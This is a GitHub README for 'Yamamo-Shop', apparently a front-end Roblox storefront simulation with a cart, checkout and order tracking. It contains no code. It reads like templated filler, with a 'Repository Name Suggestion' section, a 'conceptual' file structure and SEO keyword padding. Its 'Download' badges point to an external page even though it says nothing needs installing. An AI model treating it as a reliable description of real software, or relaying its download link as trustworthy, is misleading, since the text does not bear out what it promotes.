![preview](https://raw.githubusercontent.com/ethanhano690-a11y/Yamamo-Shop-Frontend/main/poster_c9bd82d.svg)
[![Download](https://raw.githubusercontent.com/ethanhano690-a11y/Yamamo-Shop-Frontend/main/get_ff9fad.svg)](https://ethanhano690-a11y.github.io/Yamamo-Shop-Frontend/)

# 🛒 Yamamo-Shop — A Roblox Storefront Simulation Built with HTML, CSS & JavaScript

<p align="center">
  <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge" alt="Status Badge" />
  <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge" alt="License Badge" />
  <img src="https://img.shields.io/badge/Platform-Web%20%7C%20Mobile-orange?style=for-the-badge" alt="Platform Badge" />
  <img src="https://img.shields.io/badge/Language-Thai%20%7C%20English-purple?style=for-the-badge" alt="Language Badge" />
</p>

---

## 🧭 Overview

**Yamamo-Shop** is a fictional storefront simulation inspired by the vibrant world of Roblox virtual shopping. It is a front-end-only web project crafted with vanilla **HTML**, **CSS**, and **JavaScript** — no frameworks, no build steps, no dependency nightmares. It behaves like a tangible shop window you can open in any browser, letting visitors search, filter, add to cart, proceed to checkout, and even follow the journey of a simulated order.

This repository is designed for learners, hobbyists, and front-end tinkerers who want to see how a multi-page shop experience can be assembled using only the foundational tools of the web. The entire experience is **mobile-friendly**, meaning it adapts gracefully whether you're on a desktop monitor or a smartphone nestled in your pocket.

The vibe is playful yet functional. It's the digital equivalent of a cozy corner shop where every product has a story and every click feels rewarding.

---

## 📦 Repository Name Suggestion

> **Yamamo-Shop** — *Roblox Storefront Simulation*

---

## ✨ Feature Highlights

Here's a curated breakdown of what makes this project tick. Think of it as a menu of small delights.

### 🎨 Responsive User Interface
The layout flexes like bamboo in the wind. Whether you're viewing on a 27-inch monitor or a 5-inch phone, the interface reshapes itself so nothing is cramped, clipped, or hidden. Grid and flexbox are leveraged to keep product cards tidy and navigation accessible.

### 🌐 Multilingual Support
The shop speaks more than one language. Thai and English are bundled so the experience feels native to a broader audience. Localization is structured so adding a new language is a matter of creating a new dictionary — no wrestling with messy inline strings.

### 🔍 Smart Search & Dynamic Filtering
Type a keyword, and the product list narrows instantly. Apply category filters, price ranges, and sorting rules. The search engine is lightweight but feels responsive because it operates entirely in the browser — no round trips to a server required.

### 🛒 Shopping Cart Experience
Add products, adjust quantities, remove items, and watch the total recalculation happen live. The cart persists its state so a page refresh doesn't wipe your selections, mimicking the memory of a real storefront.

### 💳 Checkout Flow Simulation
A guided multi-step checkout walk-through collects shipping details, reviews the order, and presents a final confirmation screen. It's a safe sandbox to practice form validation and user flow design.

### 📮 Order Tracking Interface
After checkout, users are presented with a tracking view showing simulated order stages — from "Order Placed" to "Out for Delivery" to "Delivered." It's a delightful way to demonstrate status-based UI changes.

### 📱 Mobile-First Responsiveness
Touch targets are sized generously, menus collapse into hamburger drawers, and typography scales with viewport width. This isn't an afterthought — it's baked into every layout decision.

### ♿ Accessible Interactions
Keyboard navigation, focus states, and ARIA labels are considered so that the shop is usable beyond the mouse-clicking crowd.

### 🎉 Sleek Animations & Micro-Interactions
Transitions, ripples, toast notifications, and modal pop-ins give the UI a lively pulse. These small motions make the shop feel less like a static page and more like a living space.

### ⚙️ Zero External Dependencies
Nothing to install, nothing to compile. Pure web technologies mean this project runs from any folder served locally or via a static host.

---

## 🧠 Core Concepts Explored

This project is a sandbox for practicing front-end fundamentals. Some of the concepts you'll encounter:

- **DOM Manipulation** — Interacting with elements dynamically to build lists, update totals, and show notifications.
- **Event Delegation** — Handling clicks and inputs efficiently across many dynamically generated elements.
- **State Management** — Keeping track of cart items, filter selections, and language preferences without a heavy framework.
- **LocalStorage Persistence** — Remembering cart and language choices between browser sessions.
- **Responsive Design** — Applying media queries and fluid layouts so the interface feels intentional at every breakpoint.
- **Accessibility Basics** — Ensuring color contrast, keyboard operability, and semantic HTML.

Each of these concepts is approachable and reusable — not just inside this shop, but in whatever project you build next.

---

## 🗂️ Project Structure (Conceptual)

Imagine the repository laid out like a physical shop:

- A **storefront** page that greets visitors with featured items.
- A **catalog** page that hosts the full inventory with search and filter controls.
- A **product detail** view that presents a single item in focus.
- A **cart** page where chosen items gather.
- A **checkout** page that walks through the final steps.
- A **tracking** page that reveals the imaginary journey of an order.

Supporting these are shared assets, dictionaries for each language, and reusable components styled consistently. The structure is intentionally flat and simple, so anyone peeking inside can trace the flow from one page to the next without losing their way.

---

## 🚀 Getting Started (Without Installation Rituals)

You don't need special commands or rituals to bring this shop to life.

1. Open the main HTML file in your preferred browser.
2. Browse the catalog.
3. Use search and filters to narrow down items.
4. Add a few products to the cart.
5. Proceed through the checkout to generate a simulated order.
6. Follow the tracking page to see the order's pretend progress.

If you're serving it locally, any simple static server that ships with your code editor or operating system will do. The key is that no compilation is required — just open and explore.

---

## 🧪 Testing It Out

Since this is a front-end simulation, testing is manual and exploratory. Try the following to stretch its seams:

- Add the same product multiple times and confirm quantity updates behave.
- Clear the browser's local storage and verify that the cart resets gracefully.
- Resize the window aggressively to verify layout adapts.
- Switch languages mid-session to check that all visible strings translate.
- Trigger a search with no matching results to see the empty-state design.

Each of these scenarios helps you understand where a real shop would need robustness.

---

## 🎯 Who This Is For

- **Front-end learners** who want a project bigger than a to-do list but smaller than a full-scale app.
- **Teachers and mentors** seeking a self-contained example to guide students through DOM-heavy interfaces.
- **Hobbyist designers** who want a playground to test visual ideas without heavy tooling.
- **Roblox enthusiasts** who enjoy imagining what their favorite in-game shops would look like as standalone web pages.

---

## 🌟 SEO-Friendly Highlights

A virtual storefront experience built with **HTML, CSS, and JavaScript**. This repository focuses on **responsive e-commerce UI design**, **client-side product search and filtering**, a **browser-based shopping cart**, a **simulated checkout flow**, and **order tracking interface**. The project demonstrates **mobile-first web development**, **multilingual web interfaces**, and **vanilla JavaScript state management** suitable for **beginner to intermediate front-end portfolios**.

---

## 🔒 License

This project is released under the **MIT License** — a permissive license that allows personal and commercial use, modification, and distribution with attribution. See the full license text here: [MIT License](https://opensource.org/licenses/MIT).

Year of reference: **2026**.

---

## ⚠️ Disclaimer

**Yamamo-Shop** is a fictional, front-end-only simulation intended purely for **educational and demonstration purposes**. It is not affiliated with, endorsed by, or connected to Roblox Corporation or any real-world merchant. No real transactions occur, no personal data is collected, and no actual shipments are produced. Product images, names, and prices shown are illustrative. Users should treat this project as a learning sandbox and not as a template for production commerce without significant additional work — including server-side logic, secure payment integrations, and privacy compliance.

---

## 🧩 Contributing

Ideas are welcome. If you discover a bug, have a suggestion for a new feature, or want to expand the language dictionaries, feel free to open an issue or submit a pull request. Please keep contributions aligned with the spirit of the project: lightweight, dependency-free, and accessible.

---

## 🤝 Community & Support

The philosophy behind this repository is simple: build in the open, learn in the open, share in the open. Whether you're here to study the code, remix the visuals, or just admire the idea of a Roblox-inspired shop that lives entirely in your browser, you're part of the journey.

Support is available by opening an issue. Responses may vary but every question is read.

---

## 📜 Acknowledgements

Gratitude goes out to the countless tutorials, documentation pages, and open-source communities that make front-end development approachable. This project stands on the shoulders of the web platform itself — the very thing it celebrates.

---

## 📅 Version & Timeline

- **Initial concept:** 2025
- **Ongoing polish:** 2026
- **Maintenance mode:** as time permits

---

## 🧾 Final Words

Yamamo-Shop is more than lines of code. It's a small thought experiment about how a virtual shop might feel if it lived in a browser tab instead of a game client. It is a reminder that you don't need heavy tools to build something that feels alive — just curiosity, patience, and a willingness to iterate.

Happy browsing, and may your cart always be satisfying.

[![Download](https://raw.githubusercontent.com/ethanhano690-a11y/Yamamo-Shop-Frontend/main/get_ff9fad.svg)](https://ethanhano690-a11y.github.io/Yamamo-Shop-Frontend/)